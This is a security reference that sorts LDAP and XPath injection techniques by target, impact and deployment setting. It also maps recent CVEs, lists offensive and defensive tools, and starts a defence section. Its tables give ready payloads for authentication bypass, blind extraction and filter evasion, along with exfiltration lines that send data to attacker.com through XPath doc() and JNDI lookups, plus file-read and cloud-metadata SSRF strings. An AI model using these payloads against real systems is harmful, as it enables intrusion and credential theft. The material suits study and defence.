# LDAP Injection & XPath Injection — Mutation/Variation Taxonomy

---

## Classification Structure

LDAP injection and XPath injection belong to a shared vulnerability family: **structured query language injection against hierarchical data stores**. LDAP filters query tree-structured directory services (Active Directory, OpenLDAP, eDirectory), while XPath expressions query tree-structured XML documents. Both languages lack the access control mechanisms found in SQL databases — a successful injection against LDAP can expose the entire directory, and a successful XPath injection can expose the entire XML document. This fundamental absence of query-level authorization makes both injection families uniquely dangerous compared to SQL injection.

This taxonomy organizes the attack surface along three axes:

- **Axis 1 (Primary — Mutation Target)**: What structural component of the query is being manipulated. This forms the main body of the document, organized into 9 top-level categories (§1–§9).
- **Axis 2 (Cross-cutting — Impact Type)**: What effect the mutation achieves — authentication bypass, data disclosure, RCE, privilege escalation, DoS, or SSRF. Each subtype is tagged with its primary impact.
- **Axis 3 (Deployment Scenario)**: Where the injection is weaponized — enterprise directories, XML document stores, API endpoints, network devices, or geospatial services. Covered in the scenario mapping section.

### Impact Type Summary (Axis 2)

| Code | Impact Type | Description |
|------|------------|-------------|
| **AUTH** | Authentication Bypass | Circumventing login or access control checks |
| **DISC** | Data Disclosure (Direct) | Retrieving data in the application response |
| **BLIND** | Data Disclosure (Inferential) | Extracting data via boolean/error/timing side channels |
| **RCE** | Remote Code Execution | Executing arbitrary code on the target system |
| **PRIV** | Privilege Escalation | Elevating from limited to higher-privilege access |
| **DoS** | Denial of Service | Crashing or degrading target system availability |
| **SSRF** | Server-Side Request Forgery | Forcing the server to make attacker-controlled requests |

### Shared Structural Foundation

Both LDAP and XPath operate on tree-structured data with a common query pattern:

```
[Protocol Prefix] + [Path/Base] + [Filter/Predicate] + [Attribute Selection/Projection]
```

- **LDAP**: `ldap://host:port/baseDN?attributes?scope?filter`
- **XPath**: `//root/path[predicate]/child::node()`

Injection occurs when user input is concatenated into any of these components without proper escaping. The mutation space is defined by which component is targeted and what syntactic construct is injected.

---

## §1. Query Logic Manipulation

The most fundamental injection category: altering the boolean/logical structure of the query to change its evaluation semantics. Both LDAP filters and XPath predicates use boolean logic that can be subverted through operator injection.

### §1-1. LDAP Filter Logic Injection

LDAP search filters use prefix notation with explicit boolean operators: `(&(condition1)(condition2))` for AND, `(|(condition1)(condition2))` for OR, and `(!(condition))` for NOT. Injection occurs when attacker-controlled input breaks out of a value position and introduces new filter components.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **AND filter tautology** | Injecting `*` as both username and password creates a universally-true filter | `(&(uid=*)(password=*))` | AUTH |
| **OR filter injection** | Inserting `)(|(&` to introduce an OR branch that always matches | `user=*)(|(&` + `pass=*)(&` | AUTH |
| **NOT filter negation** | Using `!(condition)` to invert restriction logic | `admin)(!(&#(1=0` | AUTH, PRIV |
| **Filter termination with garbage** | Closing the legitimate filter early and appending syntactically-valid but semantically-empty clauses | `user=admin)(&)` + `pass=x)` | AUTH |
| **Multiple filter injection** | Injecting a complete second filter after closing the first; behavior depends on server implementation (§8-1) | `user=x)(|(uid=*` | AUTH, DISC |
| **Null byte truncation** | Appending `%00` (null byte) to truncate the remainder of the filter, discarding password checks | `user=admin)%00` | AUTH |

### §1-2. XPath Predicate Logic Injection

XPath predicates enclosed in `[...]` use infix boolean operators (`and`, `or`, `not()`). Injection manipulates these to alter which nodes are selected.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **OR tautology** | Injecting `' or '1'='1` to make the predicate universally true | `[name='admin' or '1'='1']` | AUTH |
| **OR with true()** | Using XPath's built-in `true()` function instead of string comparison | `' or true() or '` | AUTH |
| **Double OR tautology** | Chaining OR conditions so that operator precedence (AND before OR) guarantees truth regardless of other conditions | `x' or 1=1 or 'x'='y` | AUTH |
| **Null byte predicate termination** | Terminating the predicate with `%00` to discard remaining conditions | `' or 1]%00` | AUTH |
| **Numeric predicate substitution** | Replacing a string predicate with a numeric position selector | `1` selects first node regardless of string match | AUTH, DISC |
| **Conditional error injection** | Using `if/then/else` (XPath 2.0+) to trigger errors on true conditions, leaking boolean information | `if (condition) then error() else 0` | BLIND |

---

## §2. Wildcard and Pattern-Based Extraction

Both LDAP and XPath support wildcard/pattern matching that can be weaponized for information discovery without requiring precise knowledge of stored values.

### §2-1. LDAP Wildcard Exploitation

The LDAP filter wildcard `*` matches zero or more characters in an attribute value. Combined with substring matching, it enables progressive data extraction.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **Universal wildcard match** | Using `*` as attribute value to match all entries | `(&(uid=*)(objectClass=*))` | DISC |
| **Prefix wildcard brute-force** | Iterating `(password=A*)`, `(password=B*)`, etc., and using differential responses to discover values character-by-character | `(&(uid=admin)(password=M*))` → match → `(&(uid=admin)(password=MY*))` | BLIND |
| **Suffix wildcard matching** | Testing `*suffix` patterns to discover values by their ending characters | `(mail=*@corp.com)` | DISC |
| **Substring wildcard matching** | Combining prefix and suffix wildcards to locate values containing known substrings | `(description=*admin*)` | DISC |
| **samAccountName enumeration** | Injecting `(samAccountName=*)` to dump all Active Directory user objects | URL parameter → `(samAccountName=*)` | DISC |
| **Binary search with wildcards** | Using lexicographic comparison with wildcards to perform binary search over attribute values, reducing query count from O(n) to O(log n) | Test `(password>=M*)` then narrow range | BLIND |

### §2-2. XPath Wildcard Node Selection

XPath wildcards (`*`, `//`, `node()`) select nodes by structural position rather than name, enabling broad document traversal.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **Root wildcard traversal** | Using `//*` to select all elements in the document | `//*` returns every element node | DISC |
| **Double-slash any-depth** | `//` traverses all descendants regardless of depth, selecting matching nodes at any level | `//password` finds all password nodes | DISC |
| **Position-based iteration** | `[position()=N]` iterates over sibling nodes without knowing their names | `//user[position()=1]/child::node()[position()=2]` | DISC |
| **node() type wildcard** | `node()` matches any node type (element, text, comment, PI) | `//user/child::node()` | DISC |
| **text() extraction** | `//text()` extracts all text content from the document regardless of element structure | `\| //text()` appended to injection | DISC |
| **Pipe union operator** | The `\|` operator unions two node-sets, allowing injection of a completely separate query | `'] \| //user/password[('` | DISC |

---

## §3. Schema and Structure Discovery

Before extracting data, an attacker must discover the structure of the target data store — attribute names for LDAP, element/node names for XML. Both injection families have specific techniques for this reconnaissance phase.

### §3-1. LDAP Attribute Discovery

LDAP directories have schemas defining valid attributes, but injected queries can test for attribute existence through differential responses.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **Attribute existence probing** | Injecting `*(ATTRIBUTE=*)` to test whether an attribute exists on an entry; response differences indicate presence/absence | `*)(uid=*)` → 200 OK vs. `*)(nonexistent=*)` → different response | BLIND |
| **objectClass enumeration** | Querying `(objectClass=*)` to discover entry types (person, user, group, computer, etc.) | `*)(objectClass=person` | DISC |
| **Default attribute brute-force** | Iterating through common LDAP attribute names: `cn`, `sn`, `uid`, `mail`, `givenName`, `userPassword`, `telephoneNumber`, `description`, `memberOf` | Script iterates attribute wordlist | BLIND |
| **Null byte field delimiter** | Appending `\x00` after a field test to cleanly terminate the injected filter while preserving validity | `*)(FIELD=*))\x00` | BLIND |
| **Error-based attribute type detection** | Injecting comparison operators that fail on type mismatch (e.g., numeric comparison on string attribute), using error differences to infer attribute types | `*)(uid>=0)` succeeds for numeric, fails for string | BLIND |

### §3-2. XPath Schema Discovery

XML documents have no enforced schema at query time (unless validated), so attackers use XPath functions to enumerate the document tree.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **count() child enumeration** | `count(/*[1]/*)` determines how many children the root element has, progressively mapping the tree | `and count(/*)=1 and '1'='1` | BLIND |
| **name() element identification** | `name(/*[1])` returns the name of the first child element; iterated to discover all element names | `and name(/*[1])='users'` | BLIND |
| **string-length() name sizing** | `string-length(name(/*[1]))` determines how many characters are in an element name, bounding the search space | `string-length(name(//node))=INT` | BLIND |
| **starts-with() brute-force** | `starts-with(name(..), 'a')` iterates through alphabet to discover element names character-by-character | `1=starts-with(name(..), 'u')` | BLIND |
| **Wordlist-based name guessing** | Testing known common element names (`user`, `password`, `email`, `role`, `admin`, `config`) against `string-length()` and `name()` for rapid discovery | 20,000-word scan in ~3 minutes | BLIND |
| **string-to-codepoints() character extraction** | Converting element names to Unicode codepoint sequences for environments where string comparison is filtered | `string-to-codepoints(name(/*[1]))` | BLIND |
| **comment() and processing-instruction() discovery** | Testing for XML comments and processing instructions that may contain sensitive metadata | `count(/comment())=1` | BLIND |

---

## §4. Blind/Inferential Data Extraction

When application responses don't directly reflect query results, attackers must extract data through side channels — boolean responses, error conditions, or timing differences. This is the most labor-intensive but also the most universally applicable technique category.

### §4-1. LDAP Blind Extraction

LDAP blind extraction relies on the presence/absence of the wildcard `*` match in filter conditions, producing differential application responses (login success/failure, search results/no results, different HTTP status codes).

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **Character-by-character wildcard** | Testing `(password=A*)`, `(password=B*)`, ... until a match is found, then `(password=MA*)`, `(password=MB*)`, etc. | `(&(uid=admin)(password=MYK*))` → match confirms prefix "MYK" | BLIND |
| **Byte-level octetStringOrderingMatch** | For binary attributes (hashed passwords), using the OID `2.5.13.18` for byte-by-byte comparison | `userPassword:2.5.13.18:=\xx\yy` | BLIND |
| **Booleanized true/false forcing** | Injecting known-true (`*(objectClass=*))(&objectClass=void`) and known-false (`void)(objectClass=void))(&objectClass=void`) patterns to calibrate boolean responses | True vs. False response baseline | BLIND |
| **Response timing differential** | Queries matching many entries take longer than those matching none; timing differences reveal match/no-match for blind extraction | Large directory + wildcard = measurable delay | BLIND |
| **Error-based extraction** | Injecting malformed filters that only error on certain conditions, using error/no-error as the boolean signal | Invalid syntax conditionally reached | BLIND |
| **HTTP response size differential** | Even without direct data in responses, matched entries may produce different response sizes (headers, redirects, page content variations) | Content-Length difference on match vs. no-match | BLIND |

### §4-2. XPath Blind Extraction

XPath blind extraction leverages the rich built-in function library (`substring()`, `string-length()`, `contains()`, `starts-with()`) for precise character-level extraction.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **substring() character extraction** | Testing each character position against each possible value: `substring(target, position, 1)='a'` | `substring(//user[1]/password,1,1)="a"` | BLIND |
| **string-length() bounding** | First determining the length of the target string to bound the extraction loop | `string-length(//user[1]/password)=8` | BLIND |
| **contains() substring search** | Testing whether a string contains specific substrings, narrowing the search space faster than character-by-character | `contains(//user[1]/password, 'admin')` | BLIND |
| **starts-with() prefix matching** | Binary search on prefixes to reduce query count | `starts-with(//user[1]/password, 'pa')` | BLIND |
| **codepoints-to-string() encoding bypass** | Using numeric codepoint comparison instead of string literals, bypassing character-level input filters | `substring(password,1,1)=codepoints-to-string(97)` — tests for 'a' | BLIND |
| **Conditional error-based extraction** | XPath 2.0+ `if/then/else` with `error()` function: if the boolean test is true, an error is thrown; the presence/absence of the error is the signal | `if (substring(//user[1]/pw,1,1)='a') then error() else 0` | BLIND |
| **DFS document crawling** | Recursive depth-first traversal of the entire XML document tree, extracting every node name, attribute, and text value through booleanized queries. Complexity: O(document size) | Automated recursive enumeration | BLIND |
| **Binary search optimization** | Instead of testing each character value sequentially (O(n) per position), performing binary search over the character space using `<` and `>` comparisons | `substring(target,1,1) > 'm'` → narrow range | BLIND |

---

## §5. Out-of-Band Data Exfiltration

Out-of-band (OOB) techniques transform blind injection (1 bit per request) into high-bandwidth extraction by making the target server send data through an external channel controlled by the attacker.

### §5-1. LDAP OOB Channels

LDAP itself has limited OOB capability, but chaining with JNDI (§9-1) opens significant OOB vectors.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **JNDI LDAP referral** | Injecting JNDI lookup references that cause the server to connect to an attacker-controlled LDAP server, exfiltrating data in the connection parameters | `${jndi:ldap://attacker.com/data}` | DISC, RCE |
| **DNS-based exfiltration via JNDI** | Using JNDI DNS lookups to encode extracted data as subdomain components in DNS queries to attacker-controlled nameservers | `${jndi:dns://attacker.com/data}` | DISC |

### §5-2. XPath OOB Channels

XPath 2.0+ provides the `doc()` and `doc-available()` functions that can make HTTP requests and access the filesystem, enabling rich OOB exfiltration.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **doc() HTTP exfiltration** | `doc()` loads an external XML document via URL; by concatenating extracted data into the URL path, data is sent to an attacker-controlled server in the HTTP request | `doc(concat("http://attacker.com/", //user[1]/password))` | DISC |
| **doc-available() boolean OOB** | `doc-available()` returns true/false based on whether a URL is accessible; combined with conditional data encoding, it performs OOB boolean extraction | `doc-available(concat("http://attacker.com/", substring(//data,1,1)))` | BLIND |
| **doc() local file read** | `doc()` with `file://` protocol reads local XML files from the server filesystem | `doc('file:///etc/config.xml')/*[1]/text()` | DISC |
| **DNS-based doc() exfiltration** | When HTTP outbound is blocked but DNS is permitted, encoding data as subdomains in `doc()` URLs forces DNS resolution with embedded data | `doc(concat("http://", //data, ".attacker.com/"))` | DISC |
| **doc() SSRF / port scanning** | Using `doc()` to make requests to internal services; different error messages for open/closed ports enable internal network mapping | `doc('http://10.10.10.10:22/')` → timeout vs. connection refused | SSRF |
| **doc() with concatenated multi-field exfiltration** | Encoding multiple fields into a single URL to exfiltrate several values per request | `doc(concat("http://attacker.com/", //user, "/", //pass))` | DISC |

---

## §6. Encoding and Filter Evasion

When input validation, WAFs, or application-level filters block obvious injection characters, attackers use encoding transformations and syntactic alternatives to bypass detection while preserving query semantics.

### §6-1. LDAP Encoding Evasion

LDAP has two distinct escaping contexts (DN escaping per RFC 2253 and search filter escaping per RFC 4515), and confusion between them is itself an attack surface.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **Hex-encoded metacharacters** | LDAP special characters can be encoded as `\XX` hex pairs (RFC 4515): `\28` = `(`, `\29` = `)`, `\2a` = `*`, `\5c` = `\` | `\28uid=admin\29` bypasses parenthesis filter | AUTH, DISC |
| **Null byte injection** | `\00` or `%00` terminates string processing in many implementations while LDAP parsers may interpret it differently | `admin)\00` | AUTH |
| **Unicode normalization bypass** | Submitting Unicode characters that normalize to ASCII metacharacters after server-side normalization (e.g., fullwidth parentheses `﹙` `﹚` → `(` `)`) | `﹙uid=admin﹚` → normalized to `(uid=admin)` | AUTH, DISC |
| **DN vs. filter escaping confusion** | DN escaping (RFC 2253) and filter escaping (RFC 4515) have different character sets; escaping for the wrong context leaves metacharacters unescaped | `#` escaped in DN but not in filter; `*` escaped in filter but not in DN | AUTH, DISC |
| **URL encoding passthrough** | Double URL encoding (`%2528` for `(`) bypasses URL-decode-then-filter pipelines that only decode once | `%2528uid%253D*%2529` | AUTH, DISC |
| **Mixed case operator injection** | While LDAP operators are case-insensitive, some filters check for specific casing | Varies by implementation | AUTH |
| **Whitespace injection** | Inserting spaces, tabs, or newlines between filter components; some parsers normalize whitespace while filters don't | `( & (uid=admin) (password=*) )` | AUTH |

### §6-2. XPath Encoding Evasion

XPath syntax uses characters that overlap with HTML/XML encoding, creating encoding-layer bypass opportunities.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **XML entity encoding** | XPath queries embedded in XML can use entity encoding: `&apos;` for `'`, `&quot;` for `"`, `&lt;` for `<` | `&apos; or &apos;1&apos;=&apos;1` | AUTH |
| **Numeric character references** | Using `&#39;` (decimal) or `&#x27;` (hex) for quote characters | `&#x27; or true() or &#x27;` | AUTH |
| **Double encoding** | URL-encoding the already-URL-encoded characters to bypass single-pass decode-then-filter | `%2527` → decoded once to `%27` → decoded again to `'` | AUTH |
| **Quote type alternation** | Switching between single quotes `'` and double quotes `"` to bypass filters targeting one type | `" or "1"="1` instead of `' or '1'='1` | AUTH |
| **Comparison operator substitution** | Replacing `=` with equivalent operators like `<` and `>` combined (`not(x < y) and not(x > y)` ≡ `x = y`) when `=` is filtered | `not(password < 'test') and not(password > 'test')` | BLIND |
| **Function-based value construction** | Using `concat()`, `string()`, `number()` to construct values dynamically instead of using literal strings that would be filtered | `concat('adm','in')` instead of `'admin'` | AUTH, DISC |
| **Comment injection (XPath 2.0)** | XPath 2.0 supports comments `(: comment :)` which can break up keywords for filter bypass | `tr(: :)ue()` — implementation-dependent | AUTH |

---

## §7. Authentication Bypass Constructs

Authentication bypass is the highest-frequency real-world impact of both LDAP and XPath injection. This section consolidates the specific constructs used to circumvent authentication, drawing on techniques from §1, §2, and §6.

### §7-1. LDAP Authentication Bypass

LDAP authentication typically works by constructing a filter like `(&(uid=INPUT)(userPassword=INPUT))` and checking if any entry matches. Injection targets either the uid or password field to force a match.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **Wildcard credential bypass** | Both fields set to `*` matches any entry with non-empty uid and password | `uid=*` + `password=*` → `(&(uid=*)(userPassword=*))` | AUTH |
| **Known-user password bypass** | Username is a known valid user; password field is injected to be ignored | `uid=admin)(|(password=` + `password=anything))` | AUTH |
| **Filter comment-out** | Closing the filter early and using null byte or comment to discard the password check | `uid=admin)%00` | AUTH |
| **Universal match with OR** | Injecting OR logic that matches all entries | `uid=*)(uid=*))(|(uid=*` | AUTH |
| **Negation-based bypass** | Using NOT to negate a false condition, creating a true match | `uid=admin)(!(password=nonexistent` | AUTH |
| **objectClass-based bypass** | Querying by objectClass instead of credentials to match all user entries | `uid=*)(objectClass=person` | AUTH |

### §7-2. XPath Authentication Bypass

XPath authentication typically queries: `//user[name='INPUT' and password='INPUT']`. Injection targets either field.

| Subtype | Mechanism | Example | Impact |
|---------|-----------|---------|--------|
| **Simple OR tautology** | `' or '1'='1` in both fields | `//user[name='' or '1'='1' and password='' or '1'='1']` | AUTH |
| **true() function injection** | Using built-in function instead of comparison | `' or true() or '` | AUTH |
| **Known-user with comment** | Injecting known username and commenting out rest | `admin' or '1'='1` in username, anything in password | AUTH |
| **Bracket closure with position** | Closing the predicate bracket and selecting first result | `admin'] \| //user[position()=1` | AUTH |
| **Empty string equality** | Injecting `'' or ''='` to create a tautology that bypasses even empty-check filters | `' or ''='` | AUTH |
| **Numeric 1=1 in double-quote context** | For applications using double quotes in XPath queries | `" or "1"="1` | AUTH |
| **First-node selection** | Injecting `'][1]\|//[` to select the first user regardless of credentials | Position-based auth bypass | AUTH |

---

## §8. Environment-Specific Exploitation

Different LDAP servers and XPath implementations have distinct parsing behaviors, supported features, and quirks. Techniques that work on one implementation may fail or produce different results on another.

### §8-1. LDAP Server Implementation Differences

| Subtype | Mechanism | Affected Platform | Impact |
|---------|-----------|------------------|--------|
| **Multiple filter handling — first-filter-wins** | When multiple complete filters are injected, OpenLDAP executes only the first filter and silently ignores subsequent ones | OpenLDAP | AUTH, DISC |
| **Multiple filter handling — error on multiple** | Active Directory (ADAM/Microsoft LDS) throws an error when multiple complete filters are submitted | AD / Microsoft LDS | DoS (info leak via error) |
| **Multiple filter handling — both executed** | SunOne Directory Server executes both injected filters and returns the union of results | SunOne | AUTH, DISC |
| **OID-based matching rules** | Active Directory supports extensible matching rules via OIDs (e.g., `2.5.13.18` for octetStringOrderingMatch), enabling byte-level comparison of binary attributes | Active Directory | BLIND |
| **LDAP referral following** | Some implementations automatically follow LDAP referrals to external servers, enabling SSRF to attacker-controlled LDAP instances | Configuration-dependent | SSRF, RCE |
| **Anonymous bind allowance** | OpenLDAP with default configuration may allow anonymous binds, enabling unauthenticated query access that amplifies injection impact | OpenLDAP (default config) | DISC |
| **Case sensitivity in attribute matching** | Attribute value comparison is case-insensitive by default in LDAP (caseIgnoreMatch), but some implementations handle casing differently for binary/octet attributes | All platforms | BLIND |

### §8-2. XPath/XQuery Implementation Differences

| Subtype | Mechanism | Affected Platform | Impact |
|---------|-----------|------------------|--------|
| **XPath 1.0 — limited function set** | Only basic string/number/boolean functions available; no `doc()`, no `if/then/else`, no `error()` | XPath 1.0 libraries (libxml2, MSXML) | BLIND only |
| **XPath 2.0+ — doc() enabled** | `doc()` function allows external document loading via HTTP/file URLs, enabling OOB exfiltration and SSRF (§5-2) | Saxon, BaseX, XPath 2.0+ engines | DISC, SSRF |
| **XPath 2.0+ — conditional error** | `if/then/else` and `error()` function enable error-based blind extraction (§4-2) | Saxon, XPath 2.0+ engines | BLIND |
| **XQuery superset exploitation** | XQuery is a superset of XPath that adds FLWOR expressions, variable declarations, and function definitions — significantly expanding the injection surface | eXist-db, BaseX, MarkLogic | DISC, RCE |
| **Extension functions (saxon:evaluate, util:eval)** | Some XPath/XQuery engines expose extension functions that can evaluate arbitrary expressions or execute system commands | Saxon (evaluate), eXist-db (util:eval) | RCE |
| **commons-jxpath property evaluation** | Apache commons-jxpath library evaluates XPath property names unsafely, allowing Java method invocation through crafted XPath expressions (CVE-2024-36401) | GeoServer via commons-jxpath | RCE |
| **XSLT injection chaining** | When XPath injection occurs within an XSLT context, additional XSLT-specific functions may be available, including `document()`, `system-property()`, and potentially `java:` or `php:` extension namespaces | Xalan, Saxon, libxslt with extensions | RCE, DISC |

---

## §9. Chaining with Adjacent Attack Classes

LDAP and XPath injections frequently serve as initial footholds that are chained with other vulnerability classes to achieve higher-impact outcomes.

### §9-1. LDAP → JNDI Deserialization Chain

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **JNDI LDAP lookup to remote class loading** | Injecting a JNDI reference (`${jndi:ldap://attacker/exploit}`) forces the JVM to connect to a malicious LDAP server that returns a Reference object pointing to an attacker-controlled codebase URL; the JVM loads and instantiates the remote class | Java application + JNDI enabled + no codebase restrictions (pre-JDK 8u191) | RCE |
| **JNDI LDAP lookup with deserialization gadgets** | When remote class loading is restricted (JDK 8u191+), the malicious LDAP server returns a serialized Java object that triggers a deserialization gadget chain (e.g., Commons Collections) present on the target's classpath | Java application + JNDI enabled + vulnerable gadget on classpath | RCE |
| **JNDI DNS exfiltration** | `${jndi:dns://attacker.com/data}` triggers DNS lookups that exfiltrate data as subdomain components, bypassing HTTP egress restrictions | Java application + JNDI enabled + DNS egress permitted | DISC |
| **Log4Shell pattern** | User input logged via Log4j 2.x triggers JNDI lookup interpolation; LDAP serves as the protocol for delivering the exploit payload | Log4j 2.0–2.17.0 | RCE |

### §9-2. XPath → XXE/XSLT Chain

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **XPath injection within XXE context** | If the XML document being queried is itself controlled via XXE, the attacker can both modify the document structure and inject XPath queries against it | XML parser with external entity processing enabled | DISC, RCE |
| **XSLT injection from XPath context** | Escalating from XPath injection to XSLT injection when the injection point is within a stylesheet, gaining access to XSLT transformation capabilities | Injection within XSLT stylesheet | RCE |
| **XPath → file read → credential harvesting** | Using `doc('file:///...')` (§5-2) to read configuration files containing database credentials, API keys, or other secrets | XPath 2.0+ with doc() enabled | DISC, PRIV |
| **XPath → SSRF → cloud metadata** | Using `doc()` to access cloud instance metadata services (e.g., `http://169.254.169.254/...`) to steal IAM credentials | XPath 2.0+ in cloud environment | PRIV, SSRF |

### §9-3. LDAP → Directory Service Exploitation

| Subtype | Mechanism | Key Condition | Impact |
|---------|-----------|---------------|--------|
| **LDAP injection → privilege group discovery** | Using injection to enumerate `memberOf` attributes, discovering admin group memberships and privilege relationships | LDAP injection in AD environment | PRIV |
| **LDAP injection → credential harvesting** | Extracting `userPassword`, `unicodePwd`, or other credential attributes through blind extraction (§4-1) | Attribute accessible to binding account | DISC, PRIV |
| **LDAP injection → service account enumeration** | Discovering service accounts with `servicePrincipalName` attributes set, identifying Kerberoastable accounts | Active Directory environment | PRIV |
| **LDAP injection → GPO modification via discovered credentials** | Using harvested AD credentials to modify Group Policy Objects for lateral movement | Post-exploitation chain | PRIV, RCE |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Key Risk |
|----------|-------------|---------------------------|----------|
| **Enterprise Login Portal** | Web app → LDAP auth against AD/OpenLDAP | §1-1, §2-1, §6-1, §7-1 | Mass authentication bypass |
| **Employee Directory Search** | Web app → LDAP search with user-controlled filters | §2-1, §3-1, §4-1 | Full directory data exfiltration |
| **XML-Based Configuration Portal** | Web app → XPath query on XML config files | §1-2, §4-2, §5-2 | Config/credential theft, SSRF |
| **SOAP/REST API with XML Processing** | API endpoint → XPath evaluation on request XML | §1-2, §2-2, §5-2, §8-2 | Data exfiltration, RCE via extensions |
| **Network Device Management (J-Web)** | Admin interface → XPath query on device config XML | §1-2, §7-2, §8-2 | Full device compromise, RCE |
| **Geospatial Data Service** | GeoServer/GeoTools → XPath property evaluation | §8-2 (commons-jxpath) | Unauthenticated RCE |
| **Java Application with JNDI** | Log4j/JNDI → LDAP lookup → deserialization | §9-1 | Unauthenticated RCE at scale |
| **Cloud-Hosted XML Service** | XPath 2.0 app → doc() → cloud metadata | §5-2, §9-2 | Cloud account takeover |
| **SSO/Federation Endpoint** | SAML/XML processing → XPath in assertion validation | §1-2, §4-2, §8-2 | Authentication bypass across federated services |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Product | CVSS | Impact |
|---------------------|-----------|---------|------|--------|
| §8-2 (commons-jxpath) + §9-2 | CVE-2024-36401 | GeoServer (all instances) | 9.8 | Unauthenticated RCE via XPath property evaluation; actively exploited in the wild |
| §8-2 (commons-jxpath) | CVE-2024-36404 | GeoTools (<31.2, <30.4, <29.6) | 9.8 | RCE through XPath expression evaluation in library API |
| §8-2 + §1-2 | CVE-2024-39565 | Juniper Junos OS J-Web (SRX/EX) | High | Unauthenticated XPath injection → remote command execution on network devices |
| §8-2 (extension functions) | CVE-2024-31573 | XMLUnit for Java (<2.10.0) | — | XPath injection via XSLT extension functions |
| §9-1 (JNDI + LDAP) | CVE-2021-44228 (Log4Shell) | Log4j 2.0–2.17.0 | 10.0 | JNDI/LDAP injection → RCE; one of the most impactful vulnerabilities in history |
| §1-1 + §7-1 | CVE-2024-37782 | Gladinet CentreStack | High | LDAP injection in username field → auth bypass + command execution |
| §9-3 + §8-1 | CVE-2025-29810 | Active Directory Domain Services | 7.5 | LDAP injection → privilege escalation to SYSTEM |
| LDAP protocol-level | CVE-2024-49112 | Windows LDAP Service | 9.8 | RCE via crafted LDAP requests (protocol-level, not filter injection) |
| LDAP protocol-level | CVE-2024-49113 (LDAPNightmare) | Windows LDAP Service | 7.5 | DoS — crash any Windows Server via crafted LDAP response |
| §7-1 | HackerOne #359290 | U.S. Dept of Defense | — | LDAP injection on authentication endpoint (bug bounty) |

---

## Detection Tools

### Offensive Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **XCat** (Python) | Blind XPath injection | Automated boolean-based extraction with `substring()`/`string-length()`; supports OOB via `doc()`; detects XPath version and selects optimal extraction method |
| **xxxpwn** | XPath injection | Advanced XPath exploitation with predictive text variant (xxxpwn_smart) |
| **xpath-blind-explorer** | Blind XPath injection | Automated blind extraction with schema discovery |
| **XmlChor** | XPath injection | Dedicated XPath exploitation framework |
| **lbi** (LDAP Blind Injection) | Blind LDAP injection | Character-by-character attribute extraction via wildcard matching |
| **LDAP-Injector** (C++) | LDAP injection | Systematic testing of alphanumeric/symbol combinations against LDAP query handling |
| **Burp Suite (Active Scanner)** | LDAP + XPath | Automated scanning with payload insertion and response differential analysis |
| **OWASP ZAP** | LDAP + XPath | Active scan rules for LDAP/XPath injection detection |

### Defensive Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **Invicti (Netsparker)** | LDAP + XPath (IAST) | Interactive Application Security Testing — detects injection at runtime |
| **Semgrep** | LDAP + XPath (SAST) | Pattern-based static analysis rules for unsafe query construction |
| **SonarQube** | LDAP + XPath (SAST) | Static analysis for string concatenation in LDAP/XPath queries |
| **ModSecurity (WAF)** | LDAP + XPath | Regex-based request filtering for injection metacharacters |
| **StackHawk** | XPath (DAST) | Dynamic scanning with XPath injection detection plugin |

### Payload Reference Collections

| Resource | Coverage |
|----------|----------|
| **PayloadsAllTheThings — LDAP Injection** | Comprehensive payload repository: auth bypass, blind extraction, attribute enumeration |
| **PayloadsAllTheThings — XPath Injection** | Comprehensive payload repository: auth bypass, blind extraction, OOB, file read |
| **HackTricks — LDAP Injection** | Technique guide with implementation-specific details and exploitation scripts |
| **HackTricks — XPath Injection** | Technique guide with XPath 1.0/2.0 differentiation and tool references |

---

## Summary: Core Principles

### The Root Cause

Both LDAP injection and XPath injection exist because of a single fundamental design choice: **the query language is embedded in-band with data values, and no standard parameterized query interface is universally available**. Unlike SQL — which eventually developed prepared statements and parameterized queries as a standardized defense — LDAP filters (RFC 4515) and XPath expressions have no equivalent standardized parameterization mechanism. LDAP's RFC 4515 defines filter syntax but provides no specification for separating structure from values at the protocol level. XPath's W3C specification defines expression syntax but provides no equivalent to SQL's `?` placeholder. This forces developers to construct queries via string concatenation, which is inherently injection-prone.

### Why Incremental Fixes Fail

Input validation and character escaping are the primary defenses recommended by OWASP and vendor documentation, but they fail incrementally because:

1. **Two escaping contexts in LDAP**: DN escaping (RFC 2253) and search filter escaping (RFC 4515) have different character sets and rules. Developers frequently apply the wrong escaping for the context, leaving metacharacters unescaped.
2. **XPath version proliferation**: XPath 1.0 has a limited attack surface, but XPath 2.0/3.0/3.1 add `doc()`, `error()`, `if/then/else`, and extension functions that dramatically expand it. Defenses designed for 1.0 are inadequate for 2.0+.
3. **Implementation-specific parsing**: Different LDAP servers (OpenLDAP, AD, SunOne) and XPath libraries (libxml2, Saxon, commons-jxpath) parse edge cases differently (§8), making universal escaping rules unreliable.
4. **Unicode normalization**: Server-side Unicode normalization can transform "safe" input back into metacharacters after validation has occurred (§6-1, §6-2).
5. **Chaining opacity**: The most severe impacts (RCE via JNDI/deserialization, SSRF via doc()) occur through chaining with adjacent attack classes (§9), which are invisible to injection-focused defenses.

### The Structural Solution

The structural solution requires defense at multiple layers:

1. **Parameterized/prepared query APIs** wherever available (e.g., LINQ-to-LDAP for .NET, parameterized XPath APIs in modern XML libraries).
